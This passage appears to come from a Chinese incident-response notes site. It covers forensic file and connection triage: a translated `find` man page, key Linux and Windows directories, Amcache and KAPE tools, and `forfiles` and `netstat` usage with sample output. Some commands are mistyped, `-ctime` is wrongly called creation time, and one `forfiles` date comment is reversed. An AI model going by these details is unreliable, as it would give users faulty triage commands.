-printf 加上 %F 指令来查看你的文件系统的类型。 -gid n 文件的数字形式的组ID是 n。 -group gname 文件属于 gname (也允许使用数字形式的组ID). -ilname pattern 和 -lname 类似，但是匹配时是不区分大小写的。 -iname pattern 和 -name 类似，但是匹配时是不区分大小写的。例如，`fo*' and `F??' 模式与文件名 `Foo', `FOO', `foo', `fOo' 等等相匹配。 -inum n 文件的 i 结点数是 n。 -ipath pattern 和 -path 类似，但是匹配时是不区分大小写的。 -iregex pattern 和 -regex 类似, 但是匹配时是不区分大小写的。 -links n 文件有 n 个链接。 -lname pattern 文件是一个与pattern 匹配的符号链接。元字符不会对`/' 或 `.' 做特殊处理。 -mmin n 对文件数据的最近一次修改是在 n 分钟之前。 -mtime n 对文件数据的最近一次修改是在 n*24 小时之前。 -name pattern 基本的文件名(将路径去掉了前面的目录)与shell模式pattern相匹配。元字符(`*', `?', 还有`[]' ) 不会匹配文件名开头的`.' 。使用 -prune 来略过一个目录及其中的文件。查看 -path 的描述中的范例。 -newer file 对文件的最近一次修改比 file 修改时间要晚。如果命令行中 -follow 在 -newer 之前，(也只有在这种情况下) -newer 会受 -follow 的影响。 -nouser 没有符合文件的数字形式的用户ID的用户。 -nogroup 没有符合文件的数字形式的组ID的组。 -path pattern 文件名与shell模式pattern相匹配。元字符不会对`/' 或 `.' 做特殊处理。因此，例如： find . -path './sr*sc' 如果存在 './src/misc' 的话，会将它打印出来。想要忽略一个完整的目录树，应当使用-prune 而不是检查目录树中所有的文件。例如：要跳过 'src/emacs' 目录和其中所有的文件和子目录，把其他找到的文件打印出来，应当这样： find . -path './src/emacs' -prune -o -print -perm mode 文件的权限位恰好是 mode (八进制或符号)。 Symbolic modes use mode 0 as a point of departure. -perm -mode 所有的权限位 mode 都被设置了的文件。 -perm +mode 任何权限位 mode 被设置了的文件。 -regex pattern 文件名与正则表达式 pattern 匹配。这是对整个路径的匹配，不是搜索文件。例如，要匹配名为`./fubar3' 的文件，可以使用正则表达式 `.*bar.' 或者 `.*b.*3'，但是不能用`b.*r3'。 -size n[bckw] 文件使用了 n 单位个存储单元。默认的单位是512字节的块，也可以用n后面加上 `b' 来指定这个值。其他的单位是字节，如果在 n 后面加上 `c' ；千字节(kB)，如果在 n 后面加上`k' ；两字节的字，如果在 n 后面加上 `w' 。大小不会计入 indirect blocks，但是会计入没有真正分配空间的疏松文件中的块。 -true 总是true。 -type c 文件是 c 类型的。类型可取值如下： b 特殊块文件(缓冲的) c 特殊字符文件(不缓冲) d 目录 p 命名管道 (FIFO) f 普通文件 l 符号链接 s 套接字 D 门 (Solaris 特有) -uid n 文件的数字形式的用户ID是 n 。 -used n 文件最后一次存取是在最后一次修改它的状态的 n 天之后。 -user uname 文件的所有者是 uname (也可以使用数字形式的用户ID). -xtype c 和 -type 相同，除非文件是一个符号链接。对于符号链接：如果没有给出 -follow ，如果文件是一个指向 c 类型文件的链接，那么返回true；如果给出了 -follow ，如果 c 是 `l' 那么返回true。换句话说，对于符号链接，-xtype 检查那些 -type 不检查的文件。 动作actions -exec command ; 执行 command；如果命令返回状态值0，那么 exec 返回true。所有 find 其余的命令行参数将作为提供给命令的参数，直到遇到一个由 `;' 组成的参数为止。命令的参数中，字符串 `{}' 将以正在处理的文件名替换。所有的 `{}' 都会被替换，不仅是在单独的一个参数中。有些版本的 find 不是这样做的。 这些参数可能需要用 `\\' 来escape 或者用括号括住，防止它们被shell展开。命令是从起始目录执行的。 -fls file 返回true；类似 -ls 但是像 -fprint 那样写入 file。 -fprint file 返回true；将文件全名打印到文件 file 中。如果运行 find 时 file 不存在，那么它将被创建。如果它存在，它将被覆盖。文件名``/dev/stdout'' 和``/dev/stderr'' 会作特殊处理；它们分别指的是标准输出和标准错误输出。 -fprint0 file 返回true；类似 -print0 但是像 -fprint 那样写入 file。 -fprintf file format 返回true；类似 -printf 但是像 -fprint 那样写入 file。 -ok command ; 类似 -exec 但是会先向用户询问 (在标准输入); 如果回应不是以 `y' 或 `Y' 起始则不会运行 command 而是返回false。 -print 返回true；在标准输出打印文件全名，然后是一个换行符。 -print0 返回true；在标准输出打印文件全名，然后是一个null字符。这样可以使得处理 find 的输出的程序可以正确地理解带有换行符的文件名。 -printf format 返回true；在标准输出打印 format , 解释 `\\' escape 还有 `%' 指令。字段宽度和精度可以像C函数 `printf' 那样来指定。与 -print 不同的是, -printf 在字符串末端不会添加一个新行。可用的escape 和指令如下： \\a 警告铃声 \\b 回退 \\c 立即停止以当前格式输出，刷新输出设备。 \\f 表格结束 \\n 新行 \\r 回车 \\t 水平tab \\v 竖直tab \\\\ 输出自身`\\' \\NNN ASCII编码是NNN(八进制)的字符 在一个 `\\' 字符后面使用任何其他字符会被作为普通的字符，因此它们都会被打印出来。 %% 输出自身`%' %a 文件最后一次存取的时间。格式是C函数 `ctime' 返回值的格式。 %Ak 文件最后一次存取的时间。格式以 k 指定，可以是 `@' 或者是C函数 `strftime' 的指令格式。下面列出了 k 可用的值；有一些并不是在所有系统上都可用，因为不同系统中 `strftime' 也不同。 @ 从 Jan. 1, 1970, 00:00 GMT 起的秒数 时间字段： H 小时 (00..23) I 小时 (01..12) k 小时 ( 0..23) l 小时 ( 1..12) M 分钟 (00..59) p 本地的 AM 或者 PM r 12小时格式的时间 (hh:mm:ss [AP]M) S 秒 (00..61) T 24小时格式的时间 (hh:mm:ss) X 本地的时间表示方法 (H:M:S) Z 时区(例如，EDT)，如果不能决定时区就是空 日期字段： a 本地一星期中每天的名称的缩写(Sun..Sat) A 本地一星期中每天的全名，可变长度 (Sunday..Saturday) b 本地每月的名称的缩写 (Jan..Dec) B 本地每月的全名，可变长度 (January..December) c 本地的日期和时间表示 (Sat Nov 04 12:02:33 EST 1989) d 一个月当中的日子 (01..31) D 日期 (mm/dd/yy) h 与 b 相同 j 一年当中的日子 (001..366) m 月份 (01..12) U 以星期日作为每周起始，一年当中的星期 (00..53) w 一星期当中的日子 (0..6) W 以星期一当作每周起始，一年当中的星期 (00..53) x 本地的日期表示 (mm/dd/yy) y 年份的最后两位 (00..99) Y 年份 (1970...) %b 文件大小，以512字节的块为单位 (四舍五入)。 %c 文件状态最后一次修改的时间。格式是C函数 `ctime' 返回值的格式。 %Ck 文件状态最后一次修改的时间。格式以 k 指定，类似于%A。 %d 文件在目录树中的深度；0 意味着文件是一个命令行参数。 %f 去掉了前面的目录的文件名 (只剩下最后的成分)。 %F 文件所在文件系统的类型；这个值可以为 -fstype 所用。 %g 文件的组名，如果组没有名称就是数字形式的组ID。 %G 文件的数字形式的组ID。 %h 文件名的前面的目录部分 (仅除去最后的成分)。 %H 据以找到了文件的命令行参数。 %i 文件的 i 结点号(16进制)。 %k 文件大小，以1kB 的块为单位 (四舍五入)。 %l 符号链接的目标 (如果文件不是一个符号链接，那么结果是空字符串)。 %m 文件的权限位 (8进制)。 %n 文件的硬连接数。 %p 文件名。 %P 文件名，去掉了据以找到了文件的命令行参数的名称部分。 %s 文件大小，以字节为单位。 %t 文件最后一次修改的时间。格式是C函数 `ctime' 返回值的格式。 %Tk 文件最后一次修改的时间。格式以 k 指定，类似于%A。 %u 文件的用户名，如果用户没有名称就是数字形式的用户ID。 %U 文件的数字形式的用户ID。 在一个 `%' 字符后面使用任何其他字符，`%' 将被忽略 (但是其他字符会被打印出来)。 -prune 如果没有给出 -depth 则返回 true; 不进入当前目录。 如果给出了 -depth 则返回false; 没有效果。 -ls 返回true；以 `ls -dils' 格式在标准输出列出文件。块以1kB 字节为单位计数，除非设置了环境变量POSIXLY_CORRECT，那样的话会使用 512字节的块。 运算符 OPERATORS 以优先级高低顺序排列： ( expr ) 强制为优先 ! expr 如果 expr 是false则返回true -not expr 与 ! expr 相同 expr1 expr2 与 (隐含的默认运算符)；如果 expr1 为false则不会执行 expr2 expr1 -a expr2 与 expr1 expr2 相同 expr1 -and expr2 与 expr1 expr2 相同 expr1 -o expr2 或；如果 expr1 为true 则不会执行 expr2 expr1 -or expr2 与 expr1 -o expr2 相同 expr1 , expr2 列表；expr1 和 expr2 都会被执行。expr1 的值被忽略，列表的值是 expr2的值 参考 locate(1L), locatedb(5L), updatedb(1L), xargs(1L) Finding Files (Info 在线帮助, 或者是打印的版本)参考：\nhttps://www.runoob.com/linux/linux-comm-find.html\nhttps://man7.org/linux/man-pages/man1/find.1.html\n官方手册：https://man7.org/linux/man-pages/man1/find.1.html\n相关用法：https://www.oracle.com/cn/technical-resources/articles/linux-calish-find.html\n5个基本用法：https://cloud.tencent.com/developer/article/1348438\nLinux man手册中文汉化 https://www.jianshu.com/p/6d4cafb20618\n常用方法 find /opt -iname \"*\" -atime 1 -type f # 查找/opt下一天内被访问过的文件 find / -iname \"*\" -cmin 1 -type f # 查找最近1分钟访问的文件 -type b/d/c/p/l/f：查找块设备、目录、字符设备、管道、符号链接、普通文件。 -mtime -n +n：按文件更改时间来查找文件，n指n天以内，+n指n天前。 -atime -n +n：按文件访问时间来查找文件，n指n天以内，+n指n天前。 -ctime -n +n：按文件创建时间来查找文件，n指n天以内，+n指n天前。 find / -ctime 0 name\"*.sh\" # 可查找一天内新增的sh文件 find / -ctime 0 name\"*\" -ls # 列出一天之内创建的文件并用正常的形式列出 find log/ -name '*.log' -newermt '2019-08-08' ! -newermt '2019-11-23' # 查找2019-08-08到2019-11-23号之间的文件 find /var/log/ -mtime +3 -type f -print # 找出 3 天”以前”被改动过的文件 72小时之前 find /var/log/ -mtime -3 -type f -print # 找出 3 天內被改动过的文件 (0 ~ 72 小时內) find /var/log/ -mtime 3 -type f -print # 找出前第 3 天被改动过的文件 (72 ~ 96 小时) find /var/log/ -name '*.log' -newermt '2019-08-08' ! -newermt '2021-11-23' -ls 2\u003e/tmp/null # 查询/var/log 下2019-08-08到2021-11-23期间所有的.log文件 find /tmp -perm 777 |more # 查找权限为777的文件 find /var/www -name \"*.php\"| xargs egrep # 查找/var/www下所有.php文件 bin目录 bin:\nbin为binary的简写，主要放置系统的必备执行文件，例如:\ncat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。\n/usr/bin:\n主要放置应用程序工具的必备执行文件，例如：\nc++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。\n/sbin:\n主要放置系统管理的必备程序，例如:\ncfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。\n/usr/sbin:\n主要放置网路管理的必备程序，例如:\ndhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等\n参考：\nhttps://blog.csdn.net/qq_36838191/article/details/83019002\nssh密钥路径 ～/.ssh及/etc/ssh\n查看文件时间 stat 针对可疑文件可以使用stat进行创建修改时间。\nNAME stat - 打印信息节点(inode)内容 SYNOPSIS(总览) stat filename [filenames ... ] DESCRIPTION(描述) stat 打印出一个信息节点的内容,它们显示为对人可读的格式的stat(2). 下面是stat的一个示例输出: File: “/” Size: 1024 Allocated Blocks: 2 Filetype: Directory Mode: (0755/drwxr-xr-x) Uid: ( 0/ root) Gid: ( 0/ system) Device: 0,0 Inode: 2 Links: 20 Access: Wed Jan 8 12:40:16 1986(00000.00:00:01) Modify: Wed Dec 18 09:32:09 1985(00021.03:08:08) Change: Wed Dec 18 09:32:09 1985(00021.03:08:08) DIAGNOSTICS(诊断) “Can't stat file” or “Can't lstat file” 通常意味着它不存在. “Can't readlink file” 暗示符号链接有错误.Windows下常见重点文件目录检查 临时目录检查 查看当前系统temp配置路径可以通过依次进入系统属性》环境变量》temp和tmp设置查看，也可以通过命令行查看：\nc:\\windows\\temp\n在cmd下执行下面的命令直接调环境变量的值可以查看相关的内容：\ndir %temp% \u0026\u0026 dir %tmp% # 列出环境变量中两个临时变量目录中存在的值 浏览器下载目录 浏览历史记录、下载的文件、浏览器启动方式、cookie信息等排查。\n最近访问的文件 windows默认会开启最近访问的文件功能，该功能会记录最近访问过的文件，通过访问目录可以查看最近访问的文件清单。\n%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\\ndir %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\ dir C:\\Documents and Settings\\Administrator\\Recent dir C:\\Documents and Settings\\DefaultUser\\Recent 预读文件夹 windows系统为增加预读取功能而自动创建的，载入内存中使用，主要用于加快系统启动和程序运行的速度，提升系统性能。\nprefetch目录为C:\\WINDOWS\\Prefetch，\ndir \"%SystemRoot%\\Prefetch\\\" 兼容相关程序查询 Amcache.hve\n解析工具(RecentFileCache.bcf) 源代码开源(c#) https://github.com/jwhwan9/dumpBCF 源代码开源(python) https://github.com/prolsen/recentfilecache-parser 用法示例：\nrfcparse.py -f C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf解析工具(Amcache.hve) 目前windows8之后都是Amcache.hve\n命令行解析 源代码开源(c#) https://github.com/EricZimmerman/AmcacheParser 下载地址 https://f001.backblazeb2.com/file/EricZimmermanTools/AmcacheParser.zip\n用法示例：\nAmcacheParser.exe -f C:\\Windows\\AppCompat\\Programs\\Amcache.hve --csv c:\\test注：某些情况下会无法导出，提示系统正在占用文件Amcache.hve 源代码开源(python) https://github.com/williballenthin/python-registry/blob/master/samples/amcache.py\n源代码开源(powershell) https://github.com/yoda66/GetAmCache/blob/master/Get-Amcache.ps1\nkape 由于该软件目前官网申请免费版迟迟没有回应，暂时无法进行测试。你可以在这里下载一个官方的老版本，但经测试功能存在问题。\nkape简单介绍https://binaryforay.blogspot.com/2019/02/introducing-kape.html\nC:\\Users\\xt\u003eC:\\Users\\xt\\Downloads\\kape.exe KAPE version 0.8.3.5 Author: Eric Zimmerman (kape@kroll.com) tsource Target source drive to copy files from (C, D:, or F:\\ for example) target Target configuration to use tdest Destination directory to copy files to. %d will be expanded to a timestamp (yyyyMMddTHHmmss). If --vhdx, --vhd or --zip is set, files will end up in VHD(X) container or zip file tlist List available targets tdetail Dump target file details tflush Delete all files in 'tdest' prior to collection msource Directory containing files to process. If using targets and this is left blank, it will be set to --tdest automatically module Module configuration to use mdest Destination directory to save output to. %d will be expanded to a timestamp (yyyyMMddTHHmmss) mlist List available modules mdetail Dump module processors details mflush Delete all files in 'mdest' prior to running modules mvars Provide a list of key:value pairs to be used for variable replacement in modules. Ex: --vars foo:bar would allow for using %foo% in a module which is replaced with bar at runtime. Multiple pairs should be separated by a comma. Do not use spaces in keys or values or between commas mef Export format (csv, html, or json). Overrides what is in module config vss Process all Volume Shadow Copies that exist on --tsource. Default is FALSE tdd Deduplicate files from --tsource \u0026 VSCs based on SHA-1. First file found wins. Default is TRUE vhdx The base name of the VHDX file to create from --tdest. This should be an identifier, NOT a filename. Use this or --vhd or --zip vhd The base name of the VHD file to create from --tdest. This should be an identifier, NOT a filename. Use this or --vhdx or --zip zip The base name of the ZIP file to create from --tdest. This should be an identifier, NOT a filename. Use this or --vhdx or --vhd scs SFTP server host/IP for transfering *compressed VHD(X)* container scp SFTP server port. Default is 22 scu SFTP server username. Required when using --scs scpw SFTP server password scc Comment to include with transfer. Useful to include where a transfer came from. Defaults to the name of the machine where KAPE is running zv If true, the VHD(X) container will be zipped after creation. Default is TRUE zm If true, directories in --mdest will be zipped. Default is FALSE zpw If set, use this password when creating zip files (--zv | --zm | --zip) debug Show debug information during processing trace Show trace information during processing gui If true, KAPE will not close the window it executes in when run from gkape. Default is FALSE guids KAPE will generate 10 GUIDs and exit. Useful when creating new targets/modules. Default is FALSE sync If true, KAPE will download the latest targets and modules from https://github.com/EricZimmerman/KapeFiles prior to running. Default is FALSE sow If true, KAPE will overwrite existing Targets and Modules when using --sync. Default is TRUE Examples: kape.exe --tsource L: --target RegistryHives --tdest \"c:\\temp\\RegistryOnly\" kape.exe --tsource H --target !ALL --tdest \"c:\\temp\\default\" --debug kape.exe --tsource \\\\server\\directory\\subdir --target !ALL --tdest \"c:\\temp\\default_%d\" --vhdx LocalHost kape.exe --msource \"c:\\temp\\default\" --module LECmd --mdest \"c:\\temp\\modulesOut\" --trace --debug Short options (single letter) are prefixed with a single dash. Long commands are prefixed with two dashes参考：\nhttps://journeyintoir.blogspot.com/2013/12/revealing-recentfilecachebcf-file.html\nhttp://www.swiftforensics.com/2013/12/amcachehve-in-windows-8-goldmine-for.html\nhttps://forensic4cast.com/forensic-4cast-awards/2020-forensic-4cast-awards/\n按照时间点查找文件 forfiles 基本用法 PS C:\\Windows\\appcompat\\Programs\u003e forfiles /? FORFILES [/P pathname] [/M searchmask] [/S] [/C command] [/D [+ | -] {yyyy/MM/dd | dd}] 描述: 选择一个文件(或一组文件)并在那个文件上 执行一个命令。这有助于批处理作业。 参数列表: /P pathname 表示开始搜索的路径。默认文件夹是当前工作的 目录 (.)。 /M searchmask 根据搜索掩码搜索文件。默认搜索掩码是 '*'。 /S 指导 forfiles 递归到子目录。像 \"DIR /S\"。 /C command 表示为每个文件执行的命令。命令字符串应该 用双引号括起来。 默认命令是 \"cmd /c echo @file\"。下列变量 可以用在命令字符串中: @file - 返回文件名。 @fname - 返回不带扩展名的文件名。 @ext - 只返回文件的扩展名。 @path - 返回文件的完整路径。 @relpath - 返回文件的相对路径。 @isdir - 如果文件类型是目录，返回 \"TRUE\"； 如果是文件，返回 \"FALSE\"。 @fsize - 以字节为单位返回文件大小。 @fdate - 返回文件上一次修改的日期。 @ftime - 返回文件上一次修改的时间。 要在命令行包括特殊字符，字符请以 0xHH 形式使用十六进制代码(例如，0x09 为 tab)。 内部 CMD.exe 命令前面应以 \"cmd /c\" 开始。 /D date 选择文件，其上一次修改日期大于或等于 (+)， 或者小于或等于 (-) 用 \"yyyy/MM/dd\" 格式指定的日期; \"yyyy/MM/dd\" format; or selects files with a 当前日期加 \"dd\" 天，或者小于或等于 (-) 当前 日期减 \"dd\" 天。有效的 \"dd\" 天数可以是 0 - 32768 范围内的任何数字。如果没有指定， \"+\" 被当作默认符号。 /? 显示此帮助消息。 示例: FORFILES /? FORFILES FORFILES /P C:\\WINDOWS /S /M DNS*.* FORFILES /S /M *.txt /C \"cmd /c type @file | more\" FORFILES /P C:\\ /S /M *.bat FORFILES /D -30 /M *.exe /C \"cmd /c echo @path 0x09 在 30 前就被更改。\" FORFILES /D 2001/01/01 /C \"cmd /c echo @fname 在 2001年1月1日就是新的。\" FORFILES /D +2021/7/29 /C \"cmd /c echo @fname 今天是新的。\" FORFILES /M *.exe /D +1 FORFILES /S /M *.doc /C \"cmd /c echo @fsize\" FORFILES /M *.txt /C \"cmd /c if @isdir==FALSE notepad.exe @file\" PS C:\\Windows\\appcompat\\Programs\u003e常用方法 fofiles /m *.jsp /D +2021/5/1 /s /p c:\\ /c \"cmd /c echo @path @fdate @ftime\" 2\u003enull # 查询2021/5/1之前的c盘目录下所有.jsp文件并输出目录文件名文件时间 forfiles /P c:\\ /S /M *.bat /C \"cmd /c echo @file is a batch file\" # 查询c目录下所有bat文件 forfiles /P c:\\ /S /M * /C \"cmd /c if @isdir==TRUE echo @file is a directory\" # 查询所有目录文件 forfiles /S /M *.* /D -365 /C \"cmd /c echo @path @file @fdate @ftime\" # 查询超过一年的文件并输出文件名和文件地址以及最近一次修改时间 forfiles /S /M *.* /D -01/01/2007 /C \"cmd /c echo @file is outdated.\" # 查2007年前的所有文件并输出 forfiles /S /M *.* /C \"cmd /c echo The extension of @file is 0x09@ext\" # 查询c下所有文件并展示所有文件的种类参考：\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/forfiles\n",
    "description": "",
    "tags": null,
    "title": "重点文件目录检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E9%87%8D%E7%82%B9%E6%96%87%E4%BB%B6%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "Linux下异常端口/连接检查 netstat 菜鸟 https://www.runoob.com/linux/linux-comm-netstat.html\n使用netstat 网络连接命令，分析可疑端口、IP、PID\nnetstat [-acCeFghilMnNoprstuvVwx][-A\u003c网络类型\u003e][--ip] 参数说明： -a或--all 显示所有连线中的Socket。 -A\u003c网络类型\u003e或--\u003c网络类型\u003e 列出该网络类型连线中的相关地址。 -c或--continuous 持续列出网络状态。 -C或--cache 显示路由器配置的快取信息。 -e或--extend 显示网络其他相关信息。 -F或--fib 显示路由缓存。 -g或--groups 显示多重广播功能群组组员名单。 -h或--help 在线帮助。 -i或--interfaces 显示网络界面信息表单。 -l或--listening 显示监控中的服务器的Socket。 -M或--masquerade 显示伪装的网络连线。 -n或--numeric 直接使用IP地址，而不通过域名服务器。 -N或--netlink或--symbolic 显示网络硬件外围设备的符号连接名称。 -o或--timers 显示计时器。 -p或--programs 显示正在使用Socket的程序识别码和程序名称。 -r或--route 显示Routing Table。 -s或--statistics 显示网络工作信息统计表。 -t或--tcp 显示TCP传输协议的连线状况。 -u或--udp 显示UDP传输协议的连线状况。 -v或--verbose 显示指令执行过程。 -V或--version 显示版本信息。 -w或--raw 显示RAW传输协议的连线状况。 -x或--unix 此参数的效果和指定\"-A unix\"参数相同。 --ip或--inet 此参数的效果和指定\"-A inet\"参数相同常用查询语句 netstat -antlp|more 监听使用IP显示所有tcp，显示正在使用socket的程序识别码和程序 netstat -nu 显示当前户籍UDP连接状况 netstat -apu 显示UDP端口号的使用情况 netstat -i 显示网卡列表 netstat -g 显示组播组的关系 netstat -s 显示网络统计信息 netstat -l 显示监听的套接口parallels@parallels-Parallels-Virtual-Platform:~$ netstat -antlp (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:631 0.0.0.0:* LISTEN - tcp6 0 0 ::1:631 :::* LISTEN - parallels@parallels-Parallels-Virtual-Platform:~$ netstat -nu Active Internet connections (w/o servers) Proto Recv-Q Send-Q Local Address Foreign Address State udp 0 0 10.211.55.14:40391 10.211.55.1:53 ESTABLISHED udp 0 0 10.211.55.14:68 10.211.55.1:67 ESTABLISHED udp 0 0 10.211.55.14:41864 10.211.55.1:53 ESTABLISHED parallels@parallels-Parallels-Virtual-Platform:~$ netstat -apu (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name udp 0 0 0.0.0.0:34725 0.0.0.0:* - udp 0 0 localhost:domain 0.0.0.0:* - udp 0 0 10.211.55.14:bootpc 10.211.55.1:bootps ESTABLISHED - udp 0 0 0.0.0.0:631 0.0.0.0:* - udp 0 0 0.0.0.0:mdns 0.0.0.0:* - udp 0 0 10.211.55.14:41864 10.211.55.1:domain ESTABLISHED - udp 0 0 0.0.0.0:mdns 0.0.0.0:* - udp6 0 0 [::]:54263 [::]:* - udp6 0 0 [::]:mdns [::]:* - parallels@parallels-Parallels-Virtual-Platform:~$ netstat -i Kernel Interface table Iface MTU RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg enp0s5 1500 517 0 0 0 510 0 0 0 BMRU lo 65536 234 0 0 0 234 0 0 0 LRU parallels@parallels-Parallels-Virtual-Platform:~$ netstat -s Ip: Forwarding: 2 830 total packets received 1 with invalid addresses 0 forwarded 0 incoming packets discarded 827 incoming packets delivered 778 requests sent out 20 outgoing packets dropped Icmp: 42 ICMP messages received 0 input ICMP message failed ICMP input histogram: destination unreachable: 42 42 ICMP messages sent 0 ICMP messages failed ICMP output histogram: destination unreachable: 42 IcmpMsg: InType3: 42 OutType3: 42 Tcp: 22 active connection openings 0 passive connection openings 4 failed connection attempts 2 connection resets received 0 connections established 387 segments received 284 segments sent out 2 segments retransmitted 0 bad segments received 18 resets sent Udp: 345 packets received 42 packets to unknown port received 0 packet receive errors 450 packets sent 0 receive buffer errors 0 send buffer errors IgnoredMulti: 15 UdpLite: TcpExt: 3 TCP sockets finished time wait in fast timer 6 delayed acks sent 185 packet headers predicted 28 acknowledgments not containing data payload received 27 predicted acknowledgments TCPLostRetransmit: 1 TCPTimeouts: 2 2 connections reset due to early user close TCPRcvCoalesce: 16 TCPAutoCorking: 6 TCPSynRetrans: 2 TCPOrigDataSent: 56 TCPDelivered: 70 IpExt: InMcastPkts: 76 OutMcastPkts: 77 InBcastPkts: 15 OutBcastPkts: 15 InOctets: 431065 OutOctets: 65974 InMcastOctets: 9435 OutMcastOctets: 9124 InBcastOctets: 1059 OutBcastOctets: 1059 InNoECTPkts: 830 parallels@parallels-Parallels-Virtual-Platform:~$ netstat -l Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:domain 0.0.0.0:* LISTEN tcp 0 0 localhost:ipp 0.0.0.0:* LISTEN tcp6 0 0 ip6-localhost:ipp [::]:* LISTEN udp 0 0 0.0.0.0:34725 0.0.0.0:* udp 0 0 localhost:domain 0.0.0.0:* udp 0 0 0.0.0.0:631 0.0.0.0:* udp 0 0 0.0.0.0:mdns 0.0.0.0:* udp6 0 0 [::]:54263 [::]:* udp6 0 0 [::]:mdns [::]:* raw6 0 0 [::]:ipv6-icmp [::]:* 7 Active UNIX domain sockets (only servers) Proto RefCnt Flags Type State I-Node Path unix 2 [ ACC ] STREAM LISTENING 40982 @/tmp/.ICE-unix/2258 unix 2 [ ACC ] STREAM LISTENING 37764 /tmp/.X11-unix/X0 unix 2 [ ACC ] SEQPACKET LISTENING 17436 /run/udev/control unix 2 [ ACC ] STREAM LISTENING 40312 @/tmp/dbus-2137JWwNxO unix 2 [ ACC ] STREAM LISTENING 37405 /run/user/1000/systemd/private unix 2 [ ACC ] STREAM LISTENING 37410 /run/user/1000/bus unix 2 [ ACC ] STREAM LISTENING 37411 /run/user/1000/gnupg/S.dirmngr unix 2 [ ACC ] STREAM LISTENING 37412 /run/user/1000/gnupg/S.gpg-agent.browser unix 2 [ ACC ] STREAM LISTENING 37414 /run/user/1000/gnupg/S.gpg-agent.extra unix 2 [ ACC ] STREAM LISTENING 37417 /run/user/1000/gnupg/S.gpg-agent.ssh unix 2 [ ACC ] STREAM LISTENING 37418 /run/user/1000/gnupg/S.gpg-agent unix 2 [ ACC ] STREAM LISTENING 37419 /run/user/1000/pk-debconf-socket unix 2 [ ACC ] STREAM LISTENING 37420 /run/user/1000/pulse/native unix 2 [ ACC ] STREAM LISTENING 37421 /run/user/1000/snapd-session-agent.socket unix 2 [ ACC ] STREAM LISTENING 38336 @/tmp/dbus-KNmuvSF3 unix 2 [ ACC ] STREAM LISTENING 37763 @/tmp/.X11-unix/X0 unix 2 [ ACC ] STREAM LISTENING 37499 /run/user/1000/keyring/control unix 2 [ ACC ] STREAM LISTENING 17409 /run/systemd/private unix 2 [ ACC ] STREAM LISTENING 17411 /run/systemd/userdb/io.systemd.DynamicUser unix 2 [ ACC ] STREAM LISTENING 40983 /tmp/.ICE-unix/2258 unix 2 [ ACC ] STREAM LISTENING 40670 /run/user/1000/keyring/pkcs11 unix 2 [ ACC ] STREAM LISTENING 17422 /run/systemd/fsck.progress unix 2 [ ACC ] STREAM LISTENING 41158 /run/user/1000/keyring/ssh unix 2 [ ACC ] STREAM LISTENING 17432 /run/systemd/journal/stdout unix 2 [ ACC ] STREAM LISTENING 27294 @/tmp/dbus-WiVk8ram unix 2 [ ACC ] STREAM LISTENING 17736 /run/systemd/journal/io.systemd.journal unix 2 [ ACC ] STREAM LISTENING 60034 @/dbus-vfs-daemon/socket-EGz2dAav unix 2 [ ACC ] STREAM LISTENING 38337 @/tmp/dbus-yLYVgUSd unix 2 [ ACC ] STREAM LISTENING 39169 /tmp/ssh-KbaAYvIXQiZa/agent.2103 unix 2 [ ACC ] STREAM LISTENING 44273 @parallels-sga-socket@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ unix 2 [ ACC ] STREAM LISTENING 22541 /run/acpid.socket unix 2 [ ACC ] STREAM LISTENING 22543 /run/avahi-daemon/socket unix 2 [ ACC ] STREAM LISTENING 22545 /run/cups/cups.sock unix 2 [ ACC ] STREAM LISTENING 22547 /run/dbus/system_bus_socket unix 2 [ ACC ] STREAM LISTENING 22549 /run/snapd.socket unix 2 [ ACC ] STREAM LISTENING 22551 /run/snapd-snap.socket unix 2 [ ACC ] STREAM LISTENING 22554 /run/uuidd/request unix 2 [ ACC ] STREAM LISTENING 22406 /run/irqbalance//irqbalance652.sock unix 2 [ ACC ] STREAM LISTENING 27293 @/tmp/dbus-Cpdg820d unix 2 [ ACC ] STREAM LISTENING 40135 @/home/parallels/.cache/ibus/dbus-SaqnFuHNwindows下异常端口/连接检查 netstat 官方 https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/netstat\n显示协议统计信息和当前 TCP/IP 网络连接。 NETSTAT [-a] [-b] [-e] [-f] [-n] [-o] [-p proto] [-r] [-s] [-x] [-t] [interval] -a 显示所有连接和侦听端口。 -b 显示在创建每个连接或侦听端口时涉及的 可执行程序。在某些情况下，已知可执行程序承载 多个独立的组件，这些情况下， 显示创建连接或侦听端口时 涉及的组件序列。在此情况下，可执行程序的 名称位于底部 [] 